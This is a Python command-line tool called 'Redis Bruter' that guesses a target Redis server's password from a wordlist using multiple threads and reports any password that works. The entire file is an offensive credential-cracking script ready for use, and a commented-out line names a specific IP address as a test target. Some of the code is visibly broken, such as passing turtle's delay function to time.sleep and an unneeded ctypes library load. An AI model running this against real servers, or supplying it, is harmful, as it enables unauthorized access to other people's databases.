from turtle import delay
import redis
import ctypes
libgcc_s = ctypes.CDLL('libgcc_s.so.1')
from datetime import datetime
import sys
import threading
import argparse
import time
parser = argparse.ArgumentParser()
banner = """
██████╗░███████╗██████╗░██╗░██████╗  ██████╗░██████╗░██╗░░░██╗████████╗███████╗██████╗░
██╔══██╗██╔════╝██╔══██╗██║██╔════╝  ██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝██╔══██╗
██████╔╝█████╗░░██║░░██║██║╚█████╗░  ██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░██████╔╝
██╔══██╗██╔══╝░░██║░░██║██║░╚═══██╗  ██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░██╔══██╗
██║░░██║███████╗██████╔╝██║██████╔╝  ██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗██║░░██║
╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝╚═════╝░  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝"""
parser.add_argument("--wordlist","-W", help="Wordlist to use")
parser.add_argument("--port","-P", help="Redis port (default 6379)",default=6379,type=int)
parser.add_argument("--host","-H", help="Target Hostname")
parser.add_argument("--threads","-T", help="Number of threads",default=3,type=int)
parser.add_argument("--delay","-D", help="Number of threads",default=0,type=int)
args=parser.parse_args()
threads = []
words = open(args.wordlist).readlines()
host =args.host
port = int(args.port)
thread_number=int(args.threads)
def check(hos,password,port=6379):
     #print(f"[*] Checking : {password.strip()} As a Redis Paswsord [*]")
    redis_db = redis.StrictRedis(host=hos, port=port, db=0, password=password)
    try :
        redis_db.info()
        print(f"[+] Valid Password Found : {password.strip()}[+]")
        exit()
    except Exception as e :
        if "WRONGPASS invalid username-password" in str(e):
            print("[-] invalid password [-]")
    time.sleep(delay)
#check("13.70.183.75","password",port=6379)

def worker():
    global host
    #print(host)
    pwd=words.pop()
    x=threading.Thread(target=check,args=(host,pwd.strip(),port))
    x.daemon=True
    x.start()
if __name__=="__main__":
    print(banner)
    print("######################## Author : Ahmed Alroky ########################")
    print(f"[*] Starting cracking Redis password for {args.host} using {args.wordlist} Wordlist [*] ")
    time.sleep(5)
    start=datetime.now()
    print("[*] Redis bruter [*]")
    count=0
    print(start)
    while len(words) > 0 :
        for thread in range(thread_number):
            #print(f"Password Count : {count} Of {len(words)}")
            print(f"Percentage : {str(float((count/len(words))*100))[:5]}% | Estimated Time : {str(datetime.now()-start).split('.')[0]}")
            worker()
            count+=1
    for thread in threads:
        thread.join()
